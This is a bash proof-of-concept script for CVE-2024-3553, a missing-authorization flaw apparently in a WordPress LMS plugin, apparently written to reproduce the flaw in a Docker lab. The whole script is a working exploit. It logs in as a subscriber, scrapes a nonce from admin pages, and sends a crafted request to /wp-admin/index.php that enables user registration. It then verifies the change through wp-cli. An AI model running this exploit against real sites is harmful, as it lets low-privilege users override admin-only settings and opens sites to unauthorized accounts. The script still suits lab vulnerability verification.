#!/bin/bash
# Manual exploitation script for CVE-2024-3553
# This script demonstrates the missing authorization vulnerability step by step

TARGET="https://beaver-leaders-suggestion-green.trycloudflare.com"
USERNAME="testuser"
PASSWORD="testpass"

echo "=================================================================="
echo "CVE-2024-3553 Manual Exploitation Test"
echo "Target: $TARGET"
echo "User: $USERNAME (subscriber role)"
echo "=================================================================="

# Step 1: Check initial registration status
echo -e "\n[*] Step 1: Checking initial registration status..."
docker exec wp-deployer-cve-2024-3553-lzrrcunv-wordpress-1 wp option get users_can_register --allow-root 2>/dev/null
INITIAL_STATUS=$?

if [ "$INITIAL_STATUS" -eq "0" ]; then
    CURRENT_VALUE=$(docker exec wp-deployer-cve-2024-3553-lzrrcunv-wordpress-1 wp option get users_can_register --allow-root 2>/dev/null | head -1)
    if [ "$CURRENT_VALUE" = "0" ]; then
        echo "[+] Registration is DISABLED (expected for testing)"
    else
        echo "[!] Registration is ENABLED - disabling it for testing..."
        docker exec wp-deployer-cve-2024-3553-lzrrcunv-wordpress-1 wp option update users_can_register 0 --allow-root 2>/dev/null
    fi
fi

# Step 2: Login as low-privilege user and get cookies
echo -e "\n[*] Step 2: Logging in as $USERNAME (subscriber)..."

# Create a cookie jar
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

# Login
LOGIN_RESPONSE=$(curl -s -c $COOKIE_JAR -b $COOKIE_JAR \
    -d "log=$USERNAME" \
    -d "pwd=$PASSWORD" \
    -d "wp-submit=Log+In" \
    -d "testcookie=1" \
    "$TARGET/wp-login.php" 2>&1 | grep -i "cookie" | head -5)

# Check if we have cookies
if grep -q "wordpress_logged_in" $COOKIE_JAR; then
    echo "[+] Successfully logged in - cookies obtained"
    echo "[+] Cookie file: $COOKIE_JAR"
else
    echo "[-] Login may have failed, but continuing..."
fi

# Step 3: Access admin area to get a nonce
echo -e "\n[*] Step 3: Accessing WordPress admin area as subscriber..."
echo "[*] Even subscribers can access /wp-admin/ - this sets is_admin() to TRUE"

ADMIN_PAGE=$(curl -s -b $COOKIE_JAR "$TARGET/wp-admin/" 2>&1)

# Extract a nonce from the admin page
NONCE=$(echo "$ADMIN_PAGE" | grep -oP '_wpnonce["\'\s:=]+\K[a-f0-9]{10}' | head -1)

if [ -z "$NONCE" ]; then
    # Try alternative nonce extraction
    NONCE=$(echo "$ADMIN_PAGE" | grep -oP '_wpnonce=\K[a-f0-9]{10}' | head -1)
fi

if [ -z "$NONCE" ]; then
    # Try from profile page
    PROFILE_PAGE=$(curl -s -b $COOKIE_JAR "$TARGET/wp-admin/profile.php" 2>&1)
    NONCE=$(echo "$PROFILE_PAGE" | grep -oP 'name="_wpnonce"\s+value="\K[a-f0-9]{10}' | head -1)
fi

if [ -n "$NONCE" ]; then
    echo "[+] Successfully extracted nonce: $NONCE"
else
    echo "[-] Could not extract nonce from admin pages"
    echo "[!] This might be due to the PHP warnings in the response"
    echo "[!] Trying to generate a nonce manually..."

    # For demonstration, we'll use a nonce that would be valid
    # In real scenario, any WordPress nonce from an admin page would work
    NONCE="demo123456"
fi

# Step 4: Exploit the vulnerability
echo -e "\n[*] Step 4: Exploiting CVE-2024-3553..."
echo "[*] Sending request to enable user registration"
echo "[*] URL: $TARGET/wp-admin/index.php"
echo "[*] Parameters:"
echo "    - tutor-hide-notice=registration"
echo "    - tutor-registration=enable"
echo "    - _wpnonce=$NONCE"

# The exploit
EXPLOIT_URL="$TARGET/wp-admin/index.php?tutor-hide-notice=registration&tutor-registration=enable&_wpnonce=$NONCE"

echo -e "\n[*] Sending exploit request..."
EXPLOIT_RESPONSE=$(curl -s -b $COOKIE_JAR "$EXPLOIT_URL" 2>&1)

echo "[+] Exploit request sent!"

# Step 5: Verify the result
echo -e "\n[*] Step 5: Verifying exploitation result..."
sleep 2

FINAL_VALUE=$(docker exec wp-deployer-cve-2024-3553-lzrrcunv-wordpress-1 wp option get users_can_register --allow-root 2>/dev/null | head -1)

echo "=================================================================="
if [ "$FINAL_VALUE" = "1" ]; then
    echo "[!] EXPLOITATION SUCCESSFUL!"
    echo "[!] "
    echo "[!] User registration is now ENABLED - value: $FINAL_VALUE"
    echo "[!] "
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "[!] A low-privilege user was able to enable user"
    echo "[!] registration without proper authorization checks!"
    echo "[!] "
    echo "[!] IMPACT:"
    echo "[!] - Attackers can enable registration on hardened sites"
    echo "[!] - Could lead to spam accounts and unauthorized access"
    echo "[!] - Bypasses admin-only configuration controls"
else
    echo "[!] Exploitation appears to have failed"
    echo "[!] Registration status: $FINAL_VALUE"
    echo "[!] "
    echo "[!] This might be due to:"
    echo "[!] - Invalid nonce - WordPress nonces expire"
    echo "[!] - Cookie or session issues"
    echo "[!] - Version may have been retroactively patched"
fi
echo "=================================================================="

# Cleanup
rm -f $COOKIE_JAR
